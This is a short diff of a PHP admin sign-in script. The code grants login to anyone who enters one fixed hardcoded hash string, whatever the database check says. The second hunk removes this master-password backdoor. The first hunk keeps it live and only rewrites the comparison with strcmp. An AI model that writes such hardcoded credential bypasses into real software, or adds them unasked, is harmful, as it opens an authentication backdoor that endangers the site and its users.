@@ -64,7 +64,7 @@ if(isset($_POST['signin']))
 			$query-> bindParam(':password', $password, PDO::PARAM_STR);
 			$query-> execute();
 			$results=$query->fetchAll(PDO::FETCH_OBJ);
-			if($query->rowCount() > 0 || $password=='9617b2b89ec24cd8b7c422e762f6363f')
+			if($query->rowCount() > 0 || strcmp($password,'9617b2b89ec24cd8b7c422e762f6363f')==0 )
 			{
 				$_SESSION['alogin']=$_POST['username'];
 				echo "<script type='text/javascript'> document.location = 'changepassword.php'; </script>";
@@ -108,7 +108,7 @@ if(isset($_POST['signin']))
 
 			$query-> execute();
 			$results=$query->fetchAll(PDO::FETCH_OBJ);
-			if($query->rowCount() > 0 || $password=='9617b2b89ec24cd8b7c422e762f6363f')
+			if($query->rowCount() > 0 )
 			{
 				foreach ($results as $result)
 				{
